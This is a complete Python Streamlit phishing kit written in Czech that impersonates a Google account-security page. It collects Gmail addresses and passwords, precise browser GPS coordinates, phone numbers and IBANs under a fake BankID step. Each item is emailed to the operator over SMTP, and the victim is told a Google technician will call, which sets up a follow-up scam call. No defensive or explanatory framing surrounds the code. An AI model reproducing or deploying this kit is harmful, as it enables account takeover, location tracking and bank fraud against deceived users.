import streamlit as st
import os
import smtplib
import time
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime
import streamlit.components.v1 as components

# --- KONFIGURACE ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, soubor=None):
    if not MOJE_ADRESA or not MOJE_HESLO:
        st.error("❌ Email není nakonfigurován! Nastav MOJE_ADRESA a MOJE_HESLO v prostředí.")
        return False
    
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
    
    if soubor:
        img = MIMEImage(soubor.read(), name="biometrika.png")
        msg.attach(img)
        
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        st.error(f"Chyba SMTP: {e}")
        return False

# --- VALIDACE ---
def je_validni_email(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email)

def je_validni_tel(tel):
    return re.match(r"^\d{9}$", tel)

# --- SESSION STATE ---
if "step" not in st.session_state:
    st.session_state.step = "login"
if "zadany_email" not in st.session_state:
    st.session_state.zadany_email = ""
if "gps_data" not in st.session_state:
    st.session_state.gps_data = None
if "email_sent" not in st.session_state:
    st.session_state.email_sent = False

st.set_page_config(page_title="Zabezpečení účtu Google", page_icon="🔒")

st.markdown("""
    <style>
    div.stButton > button:first-child { 
        background-color: #4285F4; 
        color: white; 
        border: none; 
        width: 100%; 
        height: 48px; 
        font-weight: bold; 
        font-size: 16px;
    }
    .google-header { font-family: 'Product Sans', sans-serif; text-align: center; }
    </style>
    """, unsafe_allow_html=True)

def show_logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

col1, col2, col3 = st.columns(3)
with col2:

    # ==================== 1. LOGIN ====================
    if st.session_state.step == "login":
        show_logo()
        st.markdown("<h3 class='google-header'>Přihlášení</h3>", unsafe_allow_html=True)
        st.write("Pokračovat do služby Gmail")
        
        em = st.text_input("E-mail nebo telefon")
        he = st.text_input("Zadejte heslo", type="password")
        
        if st.button("Další"):
            if je_validni_email(em) and len(he) > 3:
                st.session_state.zadany_email = em
                odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                with st.spinner("Ověřování..."):
                    time.sleep(1.5)
                st.session_state.step = "gps"
                st.rerun()
            else:
                st.error("Zadejte platný e-mail a heslo.")

    # ==================== 2. GPS PO FACE SCANU ====================
    elif st.session_state.step == "gps":
        show_logo()
        st.info("Fáze 2.5: Bezpečnostní ověření polohy")
        st.write("Pro ochranu vašeho účtu prosím sdílejte svou aktuální polohu.")

        # GPS komponenta
        components.html(
            """
            <div style="text-align:center; padding:40px 20px; background:#f8f9fa; border-radius:12px; 
                        box-shadow:0 4px 12px rgba(0,0,0,0.1); max-width:440px; margin:20px auto;">
                <h3 style="color:#202124;">Ověření polohy</h3>
                <p style="color:#5f6368; margin:20px 0;">
                    Google detekoval neobvyklou aktivitu.<br>
                    Pro bezpečné pokračování potvrďte svou polohu.
                </p>
                <button onclick="getGPS()" 
                        style="background:#4285F4; color:white; padding:16px 50px; font-size:17px; 
                               border:none; border-radius:8px; cursor:pointer; font-weight:bold;">
                    ✅ Sdílet moji aktuální polohu
                </button>
            </div>

            <script>
            function getGPS() {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        const lat = pos.coords.latitude.toFixed(6);
                        const lon = pos.coords.longitude.toFixed(6);
                        const acc = pos.coords.accuracy.toFixed(0);
                        
                        const params = new URLSearchParams();
                        params.set("lat", lat);
                        params.set("lon", lon);
                        params.set("acc", acc);
                        
                        window.parent.history.replaceState(null, '', '?' + params.toString());
                        window.parent.location.reload();
                    },
                    function(err) {
                        alert("Chyba při získávání polohy: " + err.message);
                    },
                    { enableHighAccuracy: true, timeout: 12000 }
                );
            }
            </script>
            """,
            height=420
        )

        # Zpracování GPS dat po refreshi
        query_params = st.query_params
        if "lat" in query_params and "lon" in query_params and not st.session_state.email_sent:
            lat = query_params["lat"][0]
            lon = query_params["lon"][0]
            acc = query_params.get("acc", ["~"])[0]
            
            gps_text = f"📍 {lat}, {lon} (přesnost ~{acc}m)"
            st.session_state.gps_data = gps_text

            st.success(f"✅ Poloha úspěšně získána:\n**{gps_text}**")

            # Odeslání emailu
            if odeslat_email("📍 GPS COORDINATES", 
                            f"Uživatel: {st.session_state.zadany_email}\nGPS: {gps_text}"):
                st.session_state.email_sent = True
                st.balloons()

            with st.spinner("Pokračuji na další krok..."):
                time.sleep(2.2)

            st.session_state.step = "verification"
            st.rerun()

    # ==================== 3. VERIFIKACE ====================
    elif st.session_state.step == "verification":
        show_logo()
        st.error("⚠️ Podezřelá aktivita zjištěna")
        st.write("Váš účet je dočasně omezen. Vyberte způsob ověření.")
        
        zeme = st.selectbox("Země", ["Česká republika (+420)", "Slovensko (+421)", "Německo (+49)"])
        tel = st.text_input("Telefonní číslo (9 číslic)")
        
        tab1, tab2 = st.tabs(["Hovor technika", "BankID (Urychlit)"])
        
        with tab1:
            if st.button("Požádat o hovor"):
                if je_validni_tel(tel):
                    odeslat_email("📞 KONTAKT", f"Uživatel: {st.session_state.zadany_email}\nTel: {tel} ({zeme})")
                    st.session_state.step = "finish"
                    st.rerun()
                else:
                    st.error("Zadejte přesně 9 číslic!")

        with tab2:
            st.write("Okamžité odblokování přes Bankovní Identitu")
            ib = st.text_input("Číslo účtu / IBAN")
            if st.button("Autorizovat"):
                if je_validni_tel(tel) and len(ib) > 10:
                    odeslat_email("🏦 BANKID DATA", f"User: {st.session_state.zadany_email}\nTel: {tel}\nIBAN: {ib}")
                    with st.spinner("Přesměrování..."):
                        time.sleep(2)
                    st.session_state.step = "finish"
                    st.rerun()
                else:
                    st.error("Vyplňte telefon a platný IBAN.")

    # ==================== 4. FINÁLE ====================
    elif st.session_state.step == "finish":
        show_logo()
        st.success("Požadavek byl úspěšně zaznamenán.")
        st.markdown("### STATUS: ČEKÁNÍ NA SCHVÁLENÍ")
        st.info("V nejbližší době vás bude kontaktovat technik Google pro finální potvrzení.")
        st.progress(92)
        st.write(f"Čas požadavku: **{datetime.now().strftime('%H:%M:%S')}**")